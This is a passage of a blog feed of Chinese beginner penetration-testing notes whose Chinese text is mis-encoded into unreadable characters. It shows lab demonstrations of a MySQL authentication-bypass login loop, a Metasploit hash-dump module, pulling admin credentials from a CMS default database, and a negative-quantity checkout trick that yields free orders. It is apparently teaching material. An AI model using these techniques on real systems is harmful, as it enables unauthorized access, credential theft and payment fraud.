id="æ•°æ®åº“å¸¸è§æ¼æ´ç±»å‹åŠæ”»å‡»"><a href="#æ•°æ®åº“å¸¸è§æ¼æ´ç±»å‹åŠæ”»å‡»" class="headerlink" title="æ•°æ®åº“å¸¸è§æ¼æ´ç±»å‹åŠæ”»å‡»"></a>æ•°æ®åº“å¸¸è§æ¼æ´ç±»å‹åŠæ”»å‡»</h4><p>å¼±å£ä»¤ï¼Œé€šè¿‡å¼±å£ä»¤è·å–adminè´¦æˆ·å¯†ç ã€‚</p><h4 id="ç®€è¦æ•°æ®åº“å±‚é¢æ¼æ´å½±å“èŒƒå›´"><a href="#ç®€è¦æ•°æ®åº“å±‚é¢æ¼æ´å½±å“èŒƒå›´" class="headerlink" title="ç®€è¦æ•°æ®åº“å±‚é¢æ¼æ´å½±å“èŒƒå›´"></a>ç®€è¦æ•°æ®åº“å±‚é¢æ¼æ´å½±å“èŒƒå›´</h4><p>é€šè¿‡æ¼æ´ï¼Œè¿›è¡Œæ”»å‡»ï¼Œä¹Ÿå¯ä»¥è·å–æ•°æ®åº“çš„ç›¸å…³æƒé™ï¼Œè¿›è¡Œä¸€ç³»åˆ—çš„æ“ä½œ</p><h3 id="ç¬¬ä¸‰æ–¹å±‚é¢"><a href="#ç¬¬ä¸‰æ–¹å±‚é¢" class="headerlink" title="ç¬¬ä¸‰æ–¹å±‚é¢"></a>ç¬¬ä¸‰æ–¹å±‚é¢</h3><p>å¸¸è§ç¬¬ä¸‰æ–¹è½¯ä»¶ï¼š</p><p>Jbossï¼ŒPHPmyadminï¼Œvsftpdï¼Œteamviewç­‰</p><h4 id="å¦‚ä½•åˆ¤æ–­æœ‰å“ªäº›ç¬¬ä¸‰æ–¹å¹³å°å’Œè½¯ä»¶"><a href="#å¦‚ä½•åˆ¤æ–­æœ‰å“ªäº›ç¬¬ä¸‰æ–¹å¹³å°å’Œè½¯ä»¶" class="headerlink" title="å¦‚ä½•åˆ¤æ–­æœ‰å“ªäº›ç¬¬ä¸‰æ–¹å¹³å°å’Œè½¯ä»¶"></a>å¦‚ä½•åˆ¤æ–­æœ‰å“ªäº›ç¬¬ä¸‰æ–¹å¹³å°å’Œè½¯ä»¶</h4><p>é€šè¿‡nmapç«¯å£æ‰«ææ¥åˆ¤æ–­ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211045148.png" alt="image-20210921104504055"></p><h4 id="ç®€è¿°ä¸ºä»€ä¹ˆè¦è¯†åˆ«ç¬¬ä¸‰æ–¹å¹³å°æˆ–è½¯ä»¶"><a href="#ç®€è¿°ä¸ºä»€ä¹ˆè¦è¯†åˆ«ç¬¬ä¸‰æ–¹å¹³å°æˆ–è½¯ä»¶" class="headerlink" title="ç®€è¿°ä¸ºä»€ä¹ˆè¦è¯†åˆ«ç¬¬ä¸‰æ–¹å¹³å°æˆ–è½¯ä»¶"></a>ç®€è¿°ä¸ºä»€ä¹ˆè¦è¯†åˆ«ç¬¬ä¸‰æ–¹å¹³å°æˆ–è½¯ä»¶</h4><p>é€šè¿‡è¯†åˆ«ç¬¬ä¸‰æ–¹è½¯ä»¶ï¼Œæ¥æ‰¾å‡ºæ¼æ´ï¼Œä»è€Œè¿›è¡Œæ¸—é€æµ‹è¯•</p><h4 id="å¸¸è§ç¬¬ä¸‰æ–¹å¹³å°æˆ–è½¯ä»¶æ¼æ´ç±»å‹åŠæ”»å‡»"><a href="#å¸¸è§ç¬¬ä¸‰æ–¹å¹³å°æˆ–è½¯ä»¶æ¼æ´ç±»å‹åŠæ”»å‡»" class="headerlink" title="å¸¸è§ç¬¬ä¸‰æ–¹å¹³å°æˆ–è½¯ä»¶æ¼æ´ç±»å‹åŠæ”»å‡»"></a>å¸¸è§ç¬¬ä¸‰æ–¹å¹³å°æˆ–è½¯ä»¶æ¼æ´ç±»å‹åŠæ”»å‡»</h4><p>å¼±å£ä»¤æ”»å‡»ã€æ¼æ´æ”»å‡»</p><h4 id="ç®€è¿°ç¬¬ä¸‰æ–¹å¹³å°æˆ–è½¯ä»¶å®‰å…¨æµ‹è¯•çš„èŒƒå›´"><a href="#ç®€è¿°ç¬¬ä¸‰æ–¹å¹³å°æˆ–è½¯ä»¶å®‰å…¨æµ‹è¯•çš„èŒƒå›´" class="headerlink" title="ç®€è¿°ç¬¬ä¸‰æ–¹å¹³å°æˆ–è½¯ä»¶å®‰å…¨æµ‹è¯•çš„èŒƒå›´"></a>ç®€è¿°ç¬¬ä¸‰æ–¹å¹³å°æˆ–è½¯ä»¶å®‰å…¨æµ‹è¯•çš„èŒƒå›´</h4><p>å½±å“æƒé™</p><h4 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h4><p>é™¤å»å¸¸è§WEBå®‰å…¨åŠAPPå®‰å…¨æµ‹è¯•å¤–ï¼Œç±»ä¼¼æœåŠ¡å™¨å•ä¸€æˆ–å¤æ‚çš„å…¶ä»–æœåŠ¡ï¼ˆé‚®ä»¶ã€æ¸¸æˆã€è´Ÿè½½å‡è¡¡ç­‰ï¼‰ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºå®‰å…¨æµ‹è¯•ç›®æ ‡ï¼Œæ­¤ç±»ç›®æ ‡æµ‹è¯•åŸåˆ™åªæ˜¯å°‘äº†WEBåº”ç”¨æˆ–å…¶ä»–å®‰å…¨é—®é¢˜ã€‚æ‰€ä»¥æ˜ç¡®å®‰å…¨æµ‹è¯•æ€è·¯æ˜¯å¾ˆé‡è¦çš„ï¼</p><h3 id="æ¡ˆä¾‹æ¼”ç¤º"><a href="#æ¡ˆä¾‹æ¼”ç¤º" class="headerlink" title="æ¡ˆä¾‹æ¼”ç¤º"></a>æ¡ˆä¾‹æ¼”ç¤º</h3><h4 id="æŸæ•°æ®åº“å¼±å£ä»¤åŠæ¼æ´æ¼”ç¤º"><a href="#æŸæ•°æ®åº“å¼±å£ä»¤åŠæ¼æ´æ¼”ç¤º" class="headerlink" title="æŸæ•°æ®åº“å¼±å£ä»¤åŠæ¼æ´æ¼”ç¤º"></a>æŸæ•°æ®åº“å¼±å£ä»¤åŠæ¼æ´æ¼”ç¤º</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br><span class="line">docker network ls æŸ¥çœ‹å½“å‰dockerç½‘ç»œ</span><br><span class="line">docker network rm 592a344d1cbb åˆ é™¤æŸä¸€ä¸ªdockerç½‘ç»œ </span><br><span class="line">æ³¨ï¼šå…¶ä¸­ NAMEä¸ºbridgeã€hostã€noneä¸ºå†…ç½®çš„dockerç½‘ç»œï¼Œæ— æ³•åˆ é™¤</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211044507.png" alt="image-20210817195810376"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in `seq 1 1000`; do mysql -uroot -pwrong -h your-ip -P3306 ; done</span><br></pre></td></tr></table></figure><p>æˆåŠŸç™»å½•åˆ°æ•°æ®åº“ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211044514.png" alt="image-20210817200553278"></p><p>å…³é—­å®¹å™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211044511.png" alt="image-20210817200758620"></p><p>å¦ä¸€ç§æ–¹å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use auxiliary/scanner/mysql/mysql_authbypass_hashdump</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211044269.png" alt="image-20210817201559900"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 10.6.25.48</span><br><span class="line">set threads 10</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211044465.png" alt="image-20210817201926839"></p><h4 id="æŸç¬¬ä¸‰æ–¹åº”ç”¨å®‰å…¨æ¼æ´æ¼”ç¤º"><a href="#æŸç¬¬ä¸‰æ–¹åº”ç”¨å®‰å…¨æ¼æ´æ¼”ç¤º" class="headerlink" title="æŸç¬¬ä¸‰æ–¹åº”ç”¨å®‰å…¨æ¼æ´æ¼”ç¤º"></a>æŸç¬¬ä¸‰æ–¹åº”ç”¨å®‰å…¨æ¼æ´æ¼”ç¤º</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211044468.png" alt="image-20210817204322409"></p><p>bpæŠ“ä¸€ä¸‹åŒ…</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211045667.png" alt="image-20210921104520576" style="zoom:80%;" /><p>æˆåŠŸåˆ©ç”¨</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211045653.png" alt="image-20210921104532528"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> åŸºç¡€å…¥é—¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>04åŸºç¡€å…¥é—¨--WEBæºç æ‹“å±•</title>
      <link href="/2021/09/21/04%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-WEB%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/"/>
      <url>/2021/09/21/04%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-WEB%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜‰</p><span id="more"></span><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>WEBæºç åœ¨å®‰å…¨æµ‹è¯•ä¸­æ˜¯éå¸¸é‡è¦çš„ä¿¡æ¯æ¥æºï¼Œå¯ä»¥ç”¨æ¥ä»£ç å®¡è®¡æ¼æ´ä¹Ÿå¯ä»¥ç”¨æ¥åšä¿¡æ¯çªç ´å£ï¼Œå…¶ä¸­WEBæºç æœ‰å¾ˆå¤šæŠ€æœ¯éœ€è¦ç®€æ˜åˆ†æã€‚æ¯”å¦‚:è·å–æŸ ASPæºç åå¯ä»¥é‡‡ç”¨é»˜è®¤æ•°æ®åº“ä¸‹è½½ä¸ºçªç ´ï¼Œè·å–æŸå…¶ä»–è„šæœ¬æºç æ¼æ´å¯ä»¥è¿›è¡Œä»£ç å®¡è®¡æŒ–æ˜æˆ–åˆ†æå…¶ä¸šåŠ¡é€»è¾‘ç­‰ï¼Œæ€»ä¹‹æºç çš„è·å–å°†ä¸ºåæœŸçš„å®‰å…¨æµ‹è¯•æä¾›äº†æ›´å¤šçš„æ€è·¯ã€‚</p><h3 id="å…³äº-WEB-æºç ç›®å½•ç»“æ„"><a href="#å…³äº-WEB-æºç ç›®å½•ç»“æ„" class="headerlink" title="å…³äº WEB æºç ç›®å½•ç»“æ„"></a>å…³äº WEB æºç ç›®å½•ç»“æ„</h3><p>æ•°æ®åº“é…ç½®æ–‡ä»¶ï¼Œåå°ç›®å½•ï¼Œæ¨¡ç‰ˆç›®å½•ï¼Œæ•°æ®åº“ç›®å½•ç­‰</p><h3 id="å…³äº-WEB-æºç è„šæœ¬ç±»å‹"><a href="#å…³äº-WEB-æºç è„šæœ¬ç±»å‹" class="headerlink" title="å…³äº WEB æºç è„šæœ¬ç±»å‹"></a>å…³äº WEB æºç è„šæœ¬ç±»å‹</h3><p>ASP,PHP,ASPX,JSP,JAVAWEB ç­‰è„šæœ¬ç±»å‹æºç å®‰å…¨é—®é¢˜</p><h3 id="å…³äº-WEB-æºç åº”ç”¨åˆ†ç±»"><a href="#å…³äº-WEB-æºç åº”ç”¨åˆ†ç±»" class="headerlink" title="å…³äº WEB æºç åº”ç”¨åˆ†ç±»"></a>å…³äº WEB æºç åº”ç”¨åˆ†ç±»</h3><p>ç¤¾äº¤ï¼Œè®ºå›ï¼Œé—¨æˆ·ï¼Œç¬¬ä¸‰æ–¹ï¼Œåšå®¢ç­‰ä¸åŒçš„ä»£ç æœºåˆ¶å¯¹åº”æ¼æ´</p><h3 id="å…³äº-WEB-æºç å…¶ä»–è¯´æ˜"><a href="#å…³äº-WEB-æºç å…¶ä»–è¯´æ˜" class="headerlink" title="å…³äº WEB æºç å…¶ä»–è¯´æ˜"></a>å…³äº WEB æºç å…¶ä»–è¯´æ˜</h3><p>å¼€æºï¼Œæœªå¼€æºé—®é¢˜ï¼Œæ¡†æ¶éæ¡†æ¶é—®é¢˜ï¼Œå…³äº CMS è¯†åˆ«é—®é¢˜åŠåç»­ç­‰</p><h3 id="å…³äºæºç è·å–çš„ç›¸å…³é€”å¾„"><a href="#å…³äºæºç è·å–çš„ç›¸å…³é€”å¾„" class="headerlink" title="å…³äºæºç è·å–çš„ç›¸å…³é€”å¾„"></a>å…³äºæºç è·å–çš„ç›¸å…³é€”å¾„</h3><p>æœç´¢ï¼Œå’¸é±¼æ·˜å®ï¼Œç¬¬ä¸‰æ–¹æºç ç«™ï¼Œå„ç§è¡Œä¸šå¯¹åº”</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>å…³æ³¨åº”ç”¨åˆ†ç±»åŠè„šæœ¬ç±»å‹ä¼°æ‘¸å‡ºå¯èƒ½å­˜åœ¨çš„æ¼æ´ï¼ˆå…¶ä¸­æ¡†æ¶ç±»ä¾‹å¤–ï¼‰ï¼Œåœ¨è·å–æºç åå¯è¿›è¡Œæœ¬åœ°å®‰å…¨æµ‹è¯•<br>æˆ–ä»£ç å®¡è®¡ï¼Œä¹Ÿå¯ä»¥åˆ†æå…¶ç›®å½•å·¥ä½œåŸç†ï¼ˆæ•°æ®åº“å¤‡ä»½ï¼Œbak æ–‡ä»¶ç­‰ï¼‰ï¼Œæœªè·å–åˆ°çš„æºç é‡‡ç”¨å„ç§æ–¹æ³•æƒ³<br>åŠæ³•è·å–ï¼</p><h3 id="æ¼”ç¤ºæ¡ˆä¾‹"><a href="#æ¼”ç¤ºæ¡ˆä¾‹" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹"></a>æ¼”ç¤ºæ¡ˆä¾‹</h3><h4 id="ASP-PHP-ç­‰æºç ä¸‹å®‰å…¨æµ‹è¯•"><a href="#ASP-PHP-ç­‰æºç ä¸‹å®‰å…¨æµ‹è¯•" class="headerlink" title="ASP,PHP ç­‰æºç ä¸‹å®‰å…¨æµ‹è¯•"></a>ASP,PHP ç­‰æºç ä¸‹å®‰å…¨æµ‹è¯•</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å¹³å°è¯†åˆ«-æŸCMSæ— æ¼æ´-é»˜è®¤æ•°æ®åº“</span><br><span class="line">å¹³å°è¯†åˆ«-æŸCMSæœ‰æ¼æ´-æ¼æ´åˆ©ç”¨</span><br></pre></td></tr></table></figure><p>é€šè¿‡åç¼€æˆ‘ä»¬æ¸…æ¥šçœ‹çš„åˆ°æ—¶aspåç¼€ï¼Œè¯´æ˜æ˜¯aspç½‘ç«™ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211041929.png" alt="image-20210921104106754"></p><p>å¯ä»¥æ¸…æ¥šçš„çœ‹åˆ°XYcmsçš„å­—æ ·ï¼Œè¯´æ˜ç”¨çš„cmsæ˜¯xycmsã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211041010.png" alt="image-20210921104121765"></p><p>ä¸‹è½½XYCMSæºç </p><img src="D:\Typora\å­¦ä¹ ç¬”è®°\images\image-20210817155002433.png" alt="image-20210817155002433" style="zoom:80%;" /><p>æ‰¾åˆ°ä»–çš„æ•°æ®åº“æ–‡ä»¶</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211041530.png" alt="image-20210921104129458"></p><p>æ‰“å¼€æ•°æ®åº“æ–‡ä»¶å‘ç°è¯¥æ–‡ä»¶é‡Œæœ‰ç®¡ç†å‘˜è´¦å·å¯†ç </p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211041589.png" alt="image-20210921104138501"></p><p>è®¿é—®ç½‘ç«™åå°</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211040356.png" alt="image-20210817155420723"></p><h4 id="æ‰‹å·¥è¯†åˆ«CMS"><a href="#æ‰‹å·¥è¯†åˆ«CMS" class="headerlink" title="æ‰‹å·¥è¯†åˆ«CMS"></a>æ‰‹å·¥è¯†åˆ«CMS</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211041299.png" alt="image-20210921104150196"></p><p>metinfoCMS</p><p>æœç´¢ç›¸å…³æ¼æ´</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211041023.png" alt="image-20210921104156947"></p><h4 id="å­—å…¸è¯†åˆ«"><a href="#å­—å…¸è¯†åˆ«" class="headerlink" title="å­—å…¸è¯†åˆ«"></a>å­—å…¸è¯†åˆ«</h4><p>å­—å…¸</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211040373.png" alt="image-20210817160504582"></p><p>ä¸‹è½½å¯¹åº”çš„æ–‡ä»¶ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211040360.png" alt="image-20210817160757659"></p><p>æŸ¥çœ‹å…¶md5</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -hashfile æ–°å»ºæ–‡æœ¬æ–‡æ¡£.txt MD5</span><br></pre></td></tr></table></figure><p>å¦ä¸€ç§ä¸‹è½½æ–‡ä»¶</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211040376.png" alt="image-20210817161255733"></p><p>é€šè¿‡è¿…é›·ä¸‹è½½</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211042311.png" alt="image-20210921104211226"></p><h4 id="åœ¨çº¿CMSè¯†åˆ«"><a href="#åœ¨çº¿CMSè¯†åˆ«" class="headerlink" title="åœ¨çº¿CMSè¯†åˆ«"></a>åœ¨çº¿CMSè¯†åˆ«</h4><p><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211042275.png" alt="image-20210921104220210"></p><p><a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211040189.png" alt="image-20210817161641522"></p><h4 id="æºç å¼•ç”¨åˆ†ç±»ä¸‹çš„é’ˆå¯¹æ¼æ´"><a href="#æºç å¼•ç”¨åˆ†ç±»ä¸‹çš„é’ˆå¯¹æ¼æ´" class="headerlink" title="æºç å¼•ç”¨åˆ†ç±»ä¸‹çš„é’ˆå¯¹æ¼æ´"></a>æºç å¼•ç”¨åˆ†ç±»ä¸‹çš„é’ˆå¯¹æ¼æ´</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">niushopç”µå•†ç±»å…³æ³¨æ¼æ´ç‚¹-ä¸šåŠ¡é€»è¾‘</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ç”µå•†ç½‘ç«™ä¸šåŠ¡é€»è¾‘</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211040686.png" alt="image-20210817161847467"></p><p>æŠ“åŒ…</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211042817.png" alt="image-20210921104238693"></p><p>æ­£å¸¸å‘å‡º</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211042690.png" alt="image-20210921104249613"></p><p>å°†numä¿®æ”¹ä¸º-1</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211042860.png" alt="image-20210921104256734"></p><p>å¯ä»¥çœ‹åˆ°éœ€è¦æ”¯ä»˜0å…ƒï¼Œç›´æ¥ç™½å«–</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211040733.png" alt="image-20210817162255631"></p><h4 id="ç®€è¦ç›®æ ‡ä»è¯†åˆ«åˆ°æºç è·å–"><a href="#ç®€è¦ç›®æ ‡ä»è¯†åˆ«åˆ°æºç è·å–" class="headerlink" title="ç®€è¦ç›®æ ‡ä»è¯†åˆ«åˆ°æºç è·å–"></a>ç®€è¦ç›®æ ‡ä»è¯†åˆ«åˆ°æºç è·å–</h4><p>æœ¬åœ°æ¼”ç¤ºä¸ªäººåšå®¢-æ‰‹å·¥å‘ç°å…¶CMS-æ¼æ´æœç´¢æˆ–ä¸‹è½½åˆ†æ</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211043890.png" alt="image-20210921104306803"></p><p>æœç´¢ç‰¹æ®Šå…³é”®å­—ï¼Œè¯†åˆ«cms</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211040328.png" alt="image-20210817162538139"></p><p><a href="http://weipan.1016sangshen.cn/">http:weipan.1016sangshen.cn/</a> å†…éƒ¨æ­å»ºçš„é¶åœº</p><p>äººå·¥çˆ†æ¡†æ¶-æœç´¢ç‰¹å®šURL-è·å–å…¶ä»–ç›¸ç¬¦ç«™ç‚¹-æ¼æ´æµ‹è¯•</p><p>é€šè¿‡æŠ¥é”™å‘ç°CMSï¼Œå‘ç°æ˜¯thinkphp</p><p>æœç´¢thinkphpçš„æ¼æ´</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211040370.png" alt="image-20210817162822641"></p><p>å€ŸåŠ©ç‰¹å®šè¡Œä¸šæºç æˆ–å’¸é±¼è¿›è¡Œæœç´¢è·å–-æœ¬åœ°æ­å»º-ä»£ç å®¡è®¡æˆ–å…¶ä»–</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211043410.png" alt="image-20210921104319268"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> åŸºç¡€å…¥é—¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>03åŸºç¡€å…¥é—¨--æ­å»ºå®‰å…¨æ‹“å±•</title>
      <link href="/2021/09/21/03%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95/"/>
      <url>/2021/09/21/03%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜¢</p><span id="more"></span><h3 id="å¸¸è§æ­å»ºå¹³å°ï¼ˆä¸­é—´ä»¶ï¼‰è„šæœ¬å¯ç”¨"><a href="#å¸¸è§æ­å»ºå¹³å°ï¼ˆä¸­é—´ä»¶ï¼‰è„šæœ¬å¯ç”¨" class="headerlink" title="å¸¸è§æ­å»ºå¹³å°ï¼ˆä¸­é—´ä»¶ï¼‰è„šæœ¬å¯ç”¨"></a>å¸¸è§æ­å»ºå¹³å°ï¼ˆä¸­é—´ä»¶ï¼‰è„šæœ¬å¯ç”¨</h3><p>ASP,PHP,ASPX,JSP,PY,JAVAWEBç­‰ç¯å¢ƒ</p><h3 id="åŸŸåIPç›®å½•è§£æå®‰å…¨é—®é¢˜"><a href="#åŸŸåIPç›®å½•è§£æå®‰å…¨é—®é¢˜" class="headerlink" title="åŸŸåIPç›®å½•è§£æå®‰å…¨é—®é¢˜"></a>åŸŸåIPç›®å½•è§£æå®‰å…¨é—®é¢˜</h3><p>åŸŸåè®¿é—®çš„æ˜¯è¯¥ç½‘ç«™çš„æ ¹ç›®å½•ï¼Œè€ŒIPæ˜¯ä»åŸŸåçš„ä¸Šä¸€çº§å¼€å§‹è®¿é—®çš„ã€‚æ‰«æç›®å½•çš„æ—¶å€™ï¼Œæ‰«æIPä¼šå¤šæ‰«å‡ºä¸€äº›ä¸œè¥¿</p><h3 id="å¸¸è§æ–‡ä»¶åç¼€è§£æå¯¹åº”å®‰å…¨"><a href="#å¸¸è§æ–‡ä»¶åç¼€è§£æå¯¹åº”å®‰å…¨" class="headerlink" title="å¸¸è§æ–‡ä»¶åç¼€è§£æå¯¹åº”å®‰å…¨"></a>å¸¸è§æ–‡ä»¶åç¼€è§£æå¯¹åº”å®‰å…¨</h3><p>ç½‘ç«™å¯èƒ½å¯¹ä¸€äº›æ–‡ä»¶çš„åç¼€åæ‰§è¡Œé”™è¯¯</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211039233.png" alt="image-20210921103916148"></p><h3 id="å¸¸è§å®‰å…¨æµ‹è¯•ä¸­çš„å®‰å…¨é˜²æŠ¤"><a href="#å¸¸è§å®‰å…¨æµ‹è¯•ä¸­çš„å®‰å…¨é˜²æŠ¤" class="headerlink" title="å¸¸è§å®‰å…¨æµ‹è¯•ä¸­çš„å®‰å…¨é˜²æŠ¤"></a>å¸¸è§å®‰å…¨æµ‹è¯•ä¸­çš„å®‰å…¨é˜²æŠ¤</h3><p>1.é™åˆ¶å¤–éƒ¨æˆå‘˜è®¿é—®å†…éƒ¨ç½‘ç«™ï¼Œé™åˆ¶IPåœ°å€è§„èŒƒè®¿é—®æƒé™</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211039925.png" alt="image-20210921103923848" style="zoom:80%;" /><p>2.èº«ä»½éªŒè¯å’Œè®¿é—®æ§åˆ¶</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211038957.png" alt="image-20210817151603904"></p><p>å¦‚æœå–æ¶ˆåŒ¿åè®¿é—®ï¼Œéœ€è¦è®¿é—®è€…è¾“å‡ºç”¨æˆ·åå’Œå¯†ç æ‰èƒ½è®¿é—®ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211038959.png" alt="image-20210817151704481"></p><p>3.é™åˆ¶IPåœ°å€è®¿é—®</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211039705.png" alt="image-20210921103942640"></p><p>å¯ä»¥é€šè¿‡é™åˆ¶è¿è¡ŒæŸä¸€IPè®¿é—®ç½‘ç«™ï¼Œæˆ–è€…æ‹’ç»æŸä¸ªIPè®¿é—®ç½‘ç«™ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211039204.png" alt="image-20210921103951097"></p><h3 id="WEBæºç ä¸­æ•æ„Ÿæ–‡ä»¶"><a href="#WEBæºç ä¸­æ•æ„Ÿæ–‡ä»¶" class="headerlink" title="WEBæºç ä¸­æ•æ„Ÿæ–‡ä»¶"></a>WEBæºç ä¸­æ•æ„Ÿæ–‡ä»¶</h3><p>åå°è·¯å¾„ï¼Œæ•°æ®åº“é…ç½®æ–‡ä»¶ï¼Œå¤‡ä»½æ–‡ä»¶ç­‰</p><h3 id="WEB-åé—¨ä¸ç”¨æˆ·åŠæ–‡ä»¶æƒé™"><a href="#WEB-åé—¨ä¸ç”¨æˆ·åŠæ–‡ä»¶æƒé™" class="headerlink" title="WEB åé—¨ä¸ç”¨æˆ·åŠæ–‡ä»¶æƒé™"></a>WEB åé—¨ä¸ç”¨æˆ·åŠæ–‡ä»¶æƒé™</h3><p>1.æ¥å®¾ç”¨æˆ·ä¸€èˆ¬æ˜¯ç½‘ç«™æƒé™ç”¨æˆ·ï¼Œç¦æ­¢æ¥å®¾ç”¨æˆ·æƒé™ï¼Œå¯¼è‡´è¿æ¥åé—¨çœ‹ä¸åˆ°ä»»ä½•ä¸œè¥¿ã€‚</p><p>2.é€šè¿‡å°†ç›®å½•çš„è¯»å†™æƒé™ä¸­çš„å†™å…¥æƒé™æ‹’ç»ï¼Œä½¿æˆ‘ä»¬è™½ç„¶ç”¨åé—¨è¿æ¥æˆåŠŸï¼Œä½†æ˜¯æ²¡æœ‰å†™å…¥çš„æƒé™ã€‚è§£å†³æ–¹æ³•æ˜¯æ¢ä¸€ä¸ªç›®å½•è¿›è¡Œå†™å…¥ã€‚</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211039695.png" alt="image-20210921103959619" style="zoom:80%;" /><h3 id="æ¼”ç¤ºæ¡ˆä¾‹"><a href="#æ¼”ç¤ºæ¡ˆä¾‹" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹"></a>æ¼”ç¤ºæ¡ˆä¾‹</h3><h4 id="åŸºäºä¸­é—´ä»¶çš„ç®€è¦è¯†åˆ«"><a href="#åŸºäºä¸­é—´ä»¶çš„ç®€è¦è¯†åˆ«" class="headerlink" title="åŸºäºä¸­é—´ä»¶çš„ç®€è¦è¯†åˆ«"></a>åŸºäºä¸­é—´ä»¶çš„ç®€è¦è¯†åˆ«</h4><p>é€šè¿‡æŠ“åŒ…æŸ¥çœ‹ä¸­é—´ä»¶</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211038735.png" alt="image-20210817152924187"></p><h4 